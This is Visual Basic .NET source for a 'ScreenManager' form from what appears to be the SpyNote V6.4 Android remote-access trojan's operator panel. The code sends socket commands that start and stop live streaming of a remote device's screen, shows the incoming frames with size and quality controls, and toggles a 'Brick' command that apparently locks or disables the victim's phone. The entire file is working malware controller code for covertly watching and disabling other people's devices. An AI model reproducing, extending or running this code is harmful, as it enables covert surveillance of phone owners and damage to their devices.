Imports Microsoft.VisualBasic.CompilerServices
Imports System.ComponentModel
Imports System.Drawing.Imaging
Imports System.Runtime.CompilerServices
Imports SpyNote_V6._4.SN.SpyNote.Stores
Imports SpyNote_V6._4.SN
Imports SpyNote_V6._4.SN.Sockets.SpyNote.Client
Imports System.Drawing.Drawing2D

Public Class ScreenManager
    Public Const CmdOpen As Long = 116L
    Public Const CmdStart As Long = 117L
    Public Const CmdStop As Long = 118L
    Public Const RespInit As Long = 119L
    Public Const RespConnect As Long = 120L
    Public Const RespFrame As Long = 121L
    Public Const CmdBrick As Long = 122L

    Public TClient As SocketClient
    Public MClient As SocketClient
    Public Packet As Long
    Public PreView As Integer
    Public FPS As Integer
    Public Lng As String
    Public TempImage As PictureBox
    Private lock As Boolean
    Private DefProperties As Boolean
    Private go As Boolean
    Private mPoint As Point
    Public StrText0 As String
    Public StrText1 As String
    Public StrText2 As String
    Private Doyouwrite As Boolean
    Private Counter0 As Integer
    Private Counter1 As Integer
    Private Counter2 As Integer
    Private BOL As Boolean
    Private clrSplit As Color

    Public Sub New()
        Me.Packet = CLng(0)
        Me.PreView = 0
        Me.FPS = 0
        Me.Lng = "0 b"
        Me.TempImage = New PictureBox()
        Me.Doyouwrite = False
        Me.clrSplit = Color.FromArgb(255, 63, 63, 70)
        Me.InitializeComponent()
    End Sub

    Private Sub ScreenManager_Closing(ByVal sender As Object, ByVal e As CancelEventArgs) Handles Me.Closing
        Me.ResetBrick(True)
        If Me.TClient IsNot Nothing Then
            Me.TClient.Send(Store.BFF(Store.buff, CmdStop))
        End If
        If Me.MClient IsNot Nothing AndAlso Not Me.MClient.IsClose Then
            Me.MClient.Close(False)
        End If
    End Sub

    Private Sub ScreenManager_Load(ByVal sender As Object, ByVal e As EventArgs) Handles Me.Load
        MyBase.Icon = New System.Drawing.Icon(String.Concat(Store.Resources(1), "\Icons\window\win\12.ico"))
        Me.SELCTE_SZ.Renderer = New ThemeToolStripCmbx()
        Me.SELCT_QUA.Renderer = New ThemeToolStripCmbx()
        Me.mPoint = New Point(30, 30)
        Dim num As Integer = 1
        Do
            Dim num1 As Integer = num * 10
            Dim toolStripMenuItem As System.Windows.Forms.ToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
            toolStripMenuItem.Text = Conversions.ToString(If(num1 = 80, "Auto", num1))
            toolStripMenuItem.Name = String.Concat("m_item", Conversions.ToString(Me.SELCT_QUA.Items.Count))
            toolStripMenuItem.Tag = Conversions.ToString(If(num1 = 80, 71, num1))
            toolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None
            AddHandler toolStripMenuItem.Click, New EventHandler(AddressOf Me.SELCTQUA)
            Me.SELCT_QUA.Items.Add(toolStripMenuItem)
            num = num + 1
        Loop While num <= 8
        Me.TProgressBar.Interval = Store.TProgressBarInterval
        Me.Trans.Interval = Store.transparency
        Me.Trans.Enabled = True
        Me.EnsureReadyState()
    End Sub

    Public Sub EnsureReadyState()
        If Not Me.DefProperties Then
            If Me.SELCTE_SZ.Items.Count = 0 Then
                Dim sizes As String() = {"360*640", "720*1280", "1080*1920"}
                For Each sizeText As String In sizes
                    Dim item As New ToolStripMenuItem() With {
                        .Text = String.Concat("Size:", sizeText),
                        .Tag = sizeText,
                        .ImageScaling = ToolStripItemImageScaling.None
                    }
                    AddHandler item.Click, AddressOf Me.SELCTSZ
                    Me.SELCTE_SZ.Items.Add(item)
                Next
            End If
            Me.SIZLAB.Tag = "720*1280"
            Me.SIZLAB.TxText = "Size:720*1280"
            Me.SIZLAB.Enabled = True
            Me.QUALAB.Tag = "71"
            Me.QUALAB.TxText = "Quality:Auto"
            Me.QUALAB.Enabled = True
            Me.STALAB.Enabled = True
            Me.Panel1.Visible = True
            Me.DefProperties = True
        End If
    End Sub

    Private Sub LBER_Click(ByVal sender As Object, ByVal e As EventArgs) Handles LBER.Click
        Me.PNLERRORS.Visible = False
    End Sub

    Private Sub Panel1_Paint(ByVal sender As Object, ByVal e As PaintEventArgs) Handles Panel1.Paint
        ControlPaint.DrawBorder(e.Graphics, e.ClipRectangle, Me.clrSplit, ButtonBorderStyle.Dashed)
    End Sub

    Private Sub PBox_Click(ByVal sender As Object, ByVal e As EventArgs) Handles PBox.Click
        Me.PBox.Focus()
    End Sub

    Private Sub PBox_KeyDown(ByVal sender As Object, ByVal e As KeyEventArgs) Handles PBox.KeyDown
        If e.KeyCode = Keys.H Then
            Me.Panel1.Visible = False
        ElseIf e.KeyCode = Keys.S Then
            Me.Panel1.Visible = True
        End If
    End Sub

    Private Sub PBox_Paint(sender As Object, e As PaintEventArgs) Handles PBox.Paint
        If Me.PBox.Image IsNot Nothing Then
            Dim size As Size = TextRenderer.MeasureText(String.Concat(Me.Lng, Strings.Space(1), Me.FPS.ToString(), " FPS"), New Font("Segoe UI", 9.0F, FontStyle.Bold))
            Dim flag4 As Boolean = Me.mPoint.X < size.Width And Me.mPoint.Y > Me.PBox.Size.Height - 50
            If flag4 Then
                Dim rect As Rectangle = New Rectangle(5, Me.PBox.Size.Height - 50, size.Width, size.Height)
                Using brush As New SolidBrush(Color.FromArgb(160, 0, 0, 0))
                    e.Graphics.FillRectangle(brush, rect)
                End Using
            End If
            Dim text As String = String.Concat(Me.Lng, Strings.Space(1), Me.FPS.ToString(), " FPS")
            Using brush As New SolidBrush(Color.White)
                e.Graphics.DrawString(text, New Font("Segoe UI", 9.0F, FontStyle.Bold), brush, 5.0F, CSng((Me.PBox.Size.Height - 50)))
            End Using
        ElseIf Operators.ConditionalCompareObjectEqual(Me.STALAB.Tag, "1", False) And Me.Doyouwrite Then
            Dim text2 As String = If(String.IsNullOrEmpty(Me.StrText0), "Waiting for screen...", Me.StrText0)
            Using font2 As New Font("Segoe UI", 12.0F, FontStyle.Bold)
                Using white As New SolidBrush(Color.White)
                    Dim x As Integer = CInt(Math.Round(CDbl(Me.PBox.Size.Width) / 2.0))
                    Dim y As Integer = CInt(Math.Round(CDbl(Me.PBox.Size.Height) / 2.0))
                    Dim size2 As Size = TextRenderer.MeasureText(text2, font2)
                    e.Graphics.DrawString(text2, font2, white, CSng((x - size2.Width / 2)), CSng((y - size2.Height / 2)))
                End Using
            End Using
        End If
    End Sub

    Private Sub RF_Tick(ByVal sender As Object, ByVal e As EventArgs) Handles RF.Tick
        If Me.Doyouwrite Then
            Me.Counter0 += 1
            If Me.Counter0 > 3 Then
                Me.Counter1 += 1
                Me.StrText0 = If(Me.Counter1 Mod 2 = 0, "Please Wait.", "Please Wait..")
                If Me.Counter1 > 6 Then
                    Me.Counter2 += 1
                    Me.StrText1 = If(Me.Counter2 Mod 2 = 0, Me.StrText2, Nothing)
                End If
            End If
            Me.PBox.Invalidate()
        End If
    End Sub

    Private Sub SELCTQUA(ByVal sender As Object, ByVal e As EventArgs)
        Dim toolStripMenuItem As ToolStripMenuItem = CType(sender, ToolStripMenuItem)
        Me.QUALAB.Tag = RuntimeHelpers.GetObjectValue(toolStripMenuItem.Tag)
        Me.QUALAB.TxText = String.Concat("Quality:", toolStripMenuItem.Text)
        Me.QUALAB.Refresh()
        Me.SetParameters()
    End Sub

    Private Sub SELCTSZ(ByVal sender As Object, ByVal e As EventArgs)
        Dim toolStripMenuItem As ToolStripMenuItem = CType(sender, ToolStripMenuItem)
        Me.SIZLAB.Tag = RuntimeHelpers.GetObjectValue(toolStripMenuItem.Tag)
        Me.SIZLAB.TxText = String.Concat("Size:", toolStripMenuItem.Text)
        Me.SIZLAB.Refresh()
        Me.SetParameters()
    End Sub

    Private Sub SIZLAB_Click(ByVal sender As Object, ByVal e As EventArgs) Handles SIZLAB.Click
        If Me.SELCTE_SZ.Items.Count > 0 Then
            Me.SELCTE_SZ.Width = Me.SIZLAB.Width
            Me.SELCTE_SZ.Height = Me.SELCTE_SZ.PreferredSize.Height
            Dim screen As System.Drawing.Point = Me.SIZLAB.PointToScreen(New System.Drawing.Point(0, 0))
            Me.SELCTE_SZ.Show(New System.Drawing.Point(screen.X, screen.Y + Me.SIZLAB.Height))
        End If
    End Sub

    Private Sub QUALAB_Click(ByVal sender As Object, ByVal e As EventArgs) Handles QUALAB.Click
        If Me.SELCT_QUA.Items.Count > 0 Then
            Me.SELCT_QUA.Width = Me.QUALAB.Width
            Me.SELCT_QUA.Height = Me.SELCT_QUA.PreferredSize.Height
            Dim screen As System.Drawing.Point = Me.QUALAB.PointToScreen(New System.Drawing.Point(0, 0))
            Me.SELCT_QUA.Show(New System.Drawing.Point(screen.X, screen.Y + Me.QUALAB.Height))
        End If
    End Sub

    Private Sub SetParameters()
        Dim strArrays As String() = CStr(Me.SIZLAB.Tag).Split(New String() {"*"}, StringSplitOptions.RemoveEmptyEntries)
        If strArrays.Length > 1 AndAlso Me.TClient IsNot Nothing Then
            Dim payload As String() = {
                Store.BFF(Store.buff, CmdStart), Data.SplitData,
                strArrays(0), Data.SplitData, strArrays(1), Data.SplitData,
                CStr(Me.QUALAB.Tag), Data.SplitData,
                If(MyBase.WindowState = FormWindowState.Minimized, "-1", "1")
            }
            Me.TClient.Send(String.Concat(payload))
        End If
    End Sub

    Private Sub STALAB_Click(ByVal sender As Object, ByVal e As EventArgs) Handles STALAB.Click
        Try
            If Not Operators.ConditionalCompareObjectEqual(Me.STALAB.Tag, "-1", False) Then
                Me.STALABSTOP()
            Else
                Me.Packet = CLng(0)
                Me.STALAB.Text = "Stop"
                Me.STALAB.Tag = "1"
                Me.StrText0 = "Please Wait..."
                Me.Doyouwrite = True
                Me.go = False
                Me.RF.Enabled = True
                Me.StartServiceScreen()
                Me.STALAB.Enabled = False
            End If
            Me.STALAB.Refresh()
        Catch
        End Try
    End Sub

    Private Sub STALABSTOP()
        Me.ResetBrick(True)
        Me.go = False
        Me.Doyouwrite = False
        Me.RF.Enabled = False
        Me.StrText0 = Nothing
        Me.StrText1 = Nothing
        Me.StrText2 = Nothing
        Me.Counter0 = 0
        Me.Counter1 = 0
        Me.Counter2 = 0
        If Me.TClient IsNot Nothing Then
            Me.TClient.Send(Store.BFF(Store.buff, CmdStop))
        End If
        If Me.MClient IsNot Nothing AndAlso Not Me.MClient.IsClose Then
            Me.MClient.Close(False)
        End If
        Me.STALAB.Tag = "-1"
        Me.STALAB.Text = "Start"
        If Not Me.STALAB.Enabled Then
            Me.STALAB.Enabled = True
        End If
        Me.STALAB.Refresh()
    End Sub

    Public Sub StartServiceScreen()
        Me.Packet = CLng(0)
        Me.SetParameters()
    End Sub

    Public Sub TData(ByVal Ay As Array)
        Try
            Dim value As String = CStr(Ay.GetValue(1))
            If Operators.CompareString(value, "SpecialMessage", False) = 0 Then
                If Operators.CompareString(CStr(Ay.GetValue(0)), ":)", False) = 0 Then
                    Me.StrText2 = "ready to Live stream"
                End If
            ElseIf Operators.CompareString(value, Store.BFF(Store.buff, CLng(83)), False) = 0 Then
                Me.LBER.Text = CStr(Ay.GetValue(0))
                Me.PNLERRORS.Visible = True
                Me.PNLERRORS.Refresh()
                Me.STALABSTOP()
            ElseIf Operators.CompareString(value, Store.BFF(Store.buff, CLng(84)), False) = 0 Then
                If Not Me.lock Then
                    Dim strArrays As String() = CStr(Ay.GetValue(0)).Split(New String() {Data.SplitLines}, StringSplitOptions.RemoveEmptyEntries)
                    Dim length As Integer = strArrays.Length - 1
                    For num As Integer = 0 To length
                        Dim strArrays1 As String() = strArrays(num).Split(New String() {Data.SplitArray}, StringSplitOptions.RemoveEmptyEntries)
                        If strArrays1.Length < 2 Then
                            Continue For
                        End If
                        If Operators.CompareString(strArrays1(0), Store.BFF(Store.buff, CLng(95)), False) = 0 Then
                            Dim flag As Boolean = True
                            Dim strArrays2 As String() = strArrays1(1).Split(New String() {"*"}, StringSplitOptions.RemoveEmptyEntries)
                            If strArrays2.Length = 2 Then
                                Try
                                    flag = strArrays2(0).Length < 5 AndAlso strArrays2(1).Length < 5 AndAlso Conversions.ToInteger(strArrays2(0).Trim()) <= 1440 AndAlso Conversions.ToInteger(strArrays2(1).Trim()) <= 2560
                                Catch
                                    flag = False
                                End Try
                            End If
                            If flag Then
                                Dim item As New ToolStripMenuItem() With {
                                    .Text = String.Concat("Size:", strArrays1(1)),
                                    .Name = String.Concat("m_item", Me.SELCTE_SZ.Items.Count),
                                    .Tag = strArrays1(1),
                                    .ImageScaling = ToolStripItemImageScaling.None
                                }
                                AddHandler item.Click, AddressOf Me.SELCTSZ
                                Me.SELCTE_SZ.Items.Add(item)
                                If Not Me.SIZLAB.Enabled Then
                                    Me.SIZLAB.Enabled = True
                                End If
                            End If
                        End If
                    Next
                    Me.lock = True
                End If
            End If

            If Not Me.SIZLAB.Enabled Then
                Me.Panel1.Visible = False
            Else
                Me.QUALAB.Enabled = True
                Me.STALAB.Enabled = True
                Me.BTNBRICK.Enabled = True
                If Not Me.DefProperties Then
                    If Me.SELCTE_SZ.Items.Count > 0 Then
                        Dim num1 As Integer = If(Me.SELCTE_SZ.Items.Count <> 1, CInt(Math.Round(CDbl(Me.SELCTE_SZ.Items.Count) / 2)), 0)
                        Me.SIZLAB.Tag = RuntimeHelpers.GetObjectValue(Me.SELCTE_SZ.Items(num1).Tag)
                        Me.SIZLAB.TxText = String.Concat("Size:", CStr(Me.SIZLAB.Tag))
                        Me.SIZLAB.Refresh()
                    Else
                        Me.SIZLAB.Tag = "720*1280"
                        Me.SIZLAB.TxText = "Size:720*1280"
                        Me.SIZLAB.Enabled = True
                    End If
                    Me.QUALAB.Tag = "71"
                    Me.QUALAB.TxText = "Quality:Auto"
                    Me.QUALAB.Refresh()
                    Me.DefProperties = True
                    Me.Panel1.Visible = True
                End If
            End If
        Catch
        End Try
    End Sub

    Private Sub TFPS_Tick(ByVal sender As Object, ByVal e As EventArgs) Handles TFPS.Tick
        Me.FPS = Me.PreView
        Me.PreView = 0
        If Me.FPS = 0 Then
            Me.PBox.Invalidate()
        End If
    End Sub

    Private Sub TProgressBar_Tick(ByVal sender As Object, ByVal e As EventArgs) Handles TProgressBar.Tick
        If Me.TClient Is Nothing Then
            Me.Text = String.Concat(MyBase.Name, Strings.Space(1), "-> Connection Lost ...")
            Me.ProgressBar1.Value = 100
        ElseIf Not Me.TClient.IsClose Then
            If CObj(Me.Text) <> CObj(MyBase.Name) Then
                Me.Text = MyBase.Name
            End If
            Me.ProgressBar1.Colour1 = Color.FromArgb(140, 140, 140)
            Me.ProgressBar1.Colour0 = Color.FromArgb(140, 140, 140)
            If Me.MClient IsNot Nothing Then
                Me.ProgressBar1.Value = Me.MClient.mProgressBar(Store.BFF(Store.buff, RespFrame), "null")
            End If
        Else
            Me.Text = String.Concat(MyBase.Name, Strings.Space(1), "-> Connection Lost ...")
            Me.ProgressBar1.Value = 100
        End If
    End Sub

    Private Sub Trans_Tick(ByVal sender As Object, ByVal e As EventArgs) Handles Trans.Tick
        If MyBase.Opacity = 1 Then
            Me.Trans.Enabled = False
        Else
            MyBase.Opacity = MyBase.Opacity + 0.1
        End If
    End Sub

    Public Sub HandleFrame(ByVal framePacket As Long, ByVal frameBytes As Byte())
        Me.Packet = framePacket
        Me.PreView += 1
        Me.Lng = CStr(Store.BytesConverter(CLng(frameBytes.Length)).GetValue(0))
        Using stream As New IO.MemoryStream(frameBytes)
            Using bitmap As New Bitmap(Image.FromStream(stream))
                Me.TempImage.Image = CType(bitmap.Clone(), Image)
            End Using
        End Using
        Me.PBox.Image = Me.TempImage.Image
        Me.go = True
        Me.Doyouwrite = False
        Me.RF.Enabled = False
        Me.StrText0 = Nothing
        If Not Me.STALAB.Enabled Then
            Me.STALAB.Enabled = True
        End If
        If Not Me.BTNBRICK.Enabled Then
            Me.BTNBRICK.Enabled = True
        End If
        If Not Me.TProgressBar.Enabled Then
            Me.TProgressBar.Enabled = True
        End If
        If Not Me.TFPS.Enabled Then
            Me.TFPS.Enabled = True
        End If
        Me.PBox.Invalidate()
    End Sub

    Private Sub BTNBRICK_Click(ByVal sender As Object, ByVal e As EventArgs) Handles BTNBRICK.Click
        If Operators.ConditionalCompareObjectEqual(Me.BTNBRICK.Tag, "1", False) Then
            Me.BTNBRICK.Tag = "0"
            Me.ApplyBrickVisual(False)
        Else
            Me.BTNBRICK.Tag = "1"
            Me.ApplyBrickVisual(True)
        End If
        Me.SendBrickState()
    End Sub

    Private Sub ApplyBrickVisual(ByVal enabled As Boolean)
        If enabled Then
            Me.BTNBRICK.Text = "Stop"
            Me.BTNBRICK.backColorNone0 = Color.FromArgb(210, 35, 45)
            Me.BTNBRICK.backColorNone1 = Color.FromArgb(210, 35, 45)
        Else
            Me.BTNBRICK.Text = "Brick"
            Me.BTNBRICK.backColorNone0 = Color.FromArgb(20, 20, 20)
            Me.BTNBRICK.backColorNone1 = Color.FromArgb(192, 0, 0)
        End If
        Me.BTNBRICK.Refresh()
    End Sub

    Public Sub SendBrickState()
        If Me.TClient Is Nothing OrElse Me.TClient.IsClose Then Return
        Dim state As String = If(Operators.ConditionalCompareObjectEqual(Me.BTNBRICK.Tag, "1", False), "1", "0")
        Me.TClient.Send(String.Concat(Store.BFF(Store.buff, CmdBrick), Data.SplitData, state))
    End Sub

    Private Sub ResetBrick(Optional ByVal sendOff As Boolean = True)
        If Not Operators.ConditionalCompareObjectEqual(Me.BTNBRICK.Tag, "1", False) Then Return
        Me.BTNBRICK.Tag = "0"
        Me.ApplyBrickVisual(False)
        If sendOff AndAlso Me.TClient IsNot Nothing AndAlso Not Me.TClient.IsClose Then
            Me.TClient.Send(String.Concat(Store.BFF(Store.buff, CmdBrick), Data.SplitData, "0"))
        End If
    End Sub
End Class
